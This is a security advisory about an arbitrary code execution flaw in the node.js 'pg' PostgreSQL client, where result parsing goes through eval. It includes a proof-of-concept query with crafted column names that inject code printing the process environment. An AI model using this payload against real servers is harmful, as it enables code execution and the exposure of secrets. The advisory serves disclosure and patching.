## Overview
[`pg`](https://www.npmjs.com/package/pg) is a non-blocking PostgreSQL client for node.js.

Affected versions of this package are vulnerable to Arbitrary Code Execution attacks. When parsing results of a query, it goes through a form of `eval`, and with a specially crafted column name, an attacker can cause code to run remotely on the server.

**PoC:**
```js
const { Client } = require('pg')
const client = new Client()
client.connect()

const sql = `SELECT 1 AS "\\'/*", 2 AS "\\'*/\n + console.log(process.env)] = null;\n//"`

client.query(sql, (err, res) => {
  client.end()
});
```

## References
- [Postgres Security Announcement](https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability)
- [Github issue](https://github.com/brianc/node-postgres/issues/1408)
